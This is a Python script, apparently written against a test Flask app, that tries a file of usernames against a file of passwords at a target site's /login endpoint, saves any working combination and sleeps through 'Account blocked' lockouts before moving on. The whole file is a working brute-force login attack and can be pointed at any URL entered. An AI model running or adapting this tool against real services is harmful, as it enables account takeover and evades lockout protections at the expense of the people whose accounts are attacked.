import requests
import os
import time

# URL of the Flask application
url = input("enter URL = ")

# Function to read usernames from a file
def read_usernames(username_file):
    with open(username_file, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]

# Function to read passwords from a file
def read_passwords(password_file):
    with open(password_file, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]

# Function to test username and password combinations
def test_login(usernames, passwords):
    count = 0
    with open("count.txt", 'w', encoding='utf-8') as result_file:
        for username in usernames:
            password_found = False
            for password in passwords:
                data = {"username": username, "password": password}
                print(f"Testing: Username: {username}, Password: {password}")  # Log the attempt
                try:
                    response = requests.post(url + '/login', data=data, timeout=10)
                    # Check for login success
                    if "Login successful!" in response.text:
                        print(f"\033[32mCorrect combination: Username: {username}, Password: {password}\033[0m")
                        result_file.write(f"Correct combination: Username: {username}, Password: {password}\n")
                        count += 1
                        password_found = True
                        os.system('cls' if os.name == 'nt' else 'clear')  # Clear screen
                        break  # Break loop for passwords

                    # Check for account blocked response
                    if "Account blocked" in response.text:
                        print(f"\033[31mAccount blocked for username: {username}\033[0m")
                        time.sleep(60)  # Wait for 60 seconds before trying the next username
                        password_found = True
                        break  # Exit password loop for this username

                except requests.exceptions.RequestException as e:
                    print(f"Request failed for Username: {username}, Password: {password}: {e}")
                    continue  # Proceed to next password

            if not password_found:
                print(f"No correct password found for username: {username}")

            print(f"Finished checking username: {username}")

        print(f"\nTotal correct attempts: {count}")

# Address of username and password files
username_file = "usernames.txt"  # Path to username file
password_file = "passwords.txt"  # Path to password file

# Reading usernames and passwords from files
usernames = read_usernames(username_file)
passwords = read_passwords(password_file)

# Testing the login attempts
test_login(usernames, passwords)
